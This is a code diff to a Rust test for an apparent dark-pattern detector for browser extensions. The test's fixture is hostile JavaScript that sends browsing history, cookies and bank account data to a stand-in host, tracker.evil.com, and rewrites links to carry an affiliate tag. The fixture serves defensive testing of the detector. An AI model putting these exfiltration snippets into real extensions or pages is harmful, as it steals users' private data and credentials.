@@ -11,11 +11,24 @@ fn test_full_dark_pattern_detection() {
             link.href = link.href + '?tag=myaffiliate-20';
         });
 
-        // Data exfiltration - history sent to external server
+        // Data exfiltration - history and cookies sent to external server
         let history = await chrome.history.search({ text: '' });
+        let cookies = document.cookie;
         fetch('https://tracker.evil.com/collect', {
             method: 'POST',
             body: JSON.stringify(history)
+        });
+        fetch('https://tracker.evil.com/cookies', {
+            method: 'POST',
+            body: cookies
+        });
+
+        // Cross-domain network data exfiltration (triggers DataExfiltration finding)
+        let bankData = await fetch('https://bank.com/api/accounts');
+        let parsed = await bankData.json();
+        fetch('https://tracker.evil.com/exfil', {
+            method: 'POST',
+            body: JSON.stringify(parsed)
         });
 
         // Review nagging
@@ -47,20 +60,44 @@ fn test_full_dark_pattern_detection() {
         "Should detect review nagging"
     );
 
-    // Check endpoint exists for the tracker
-    let evil_endpoint = endpoints
-        .iter()
-        .find(|e| e.url.contains("evil.com") && !e.data_sources.is_empty())
-        .expect("Should find evil.com endpoint with data sources");
-
-    // Verify the endpoint has correct data sources tracked
-    // Note: The source tracker tracks history assigned to variables via JSON.stringify(history)
+    // Check for data exfiltration (detected by javascript.rs cross-domain check)
     assert!(
-        evil_endpoint
-            .data_sources
-            .iter()
-            .any(|s| matches!(s, DataSource::BrowsingHistory)),
+        all_findings.iter().any(|f| matches!(
+            &f.category,
+            Category::DarkPattern(DarkPatternType::DataExfiltration)
+        )),
+        "Should detect data exfiltration"
+    );
+
+    // Check endpoints exist for the tracker - look for any evil.com endpoint with data sources
+    let evil_endpoints: Vec<_> = endpoints
+        .iter()
+        .filter(|e| e.url.contains("evil.com") && !e.data_sources.is_empty())
+        .collect();
+
+    assert!(
+        !evil_endpoints.is_empty(),
+        "Should find evil.com endpoints with data sources"
+    );
+
+    // Verify at least one endpoint has BrowsingHistory as a data source
+    assert!(
+        evil_endpoints.iter().any(|e| {
+            e.data_sources
+                .iter()
+                .any(|s| matches!(s, DataSource::BrowsingHistory))
+        }),
         "Should track BrowsingHistory as data source"
+    );
+
+    // Verify at least one endpoint has Cookie as a data source
+    assert!(
+        evil_endpoints.iter().any(|e| {
+            e.data_sources
+                .iter()
+                .any(|s| matches!(s, DataSource::Cookie(_)))
+        }),
+        "Should track Cookie as data source"
     );
 }
 
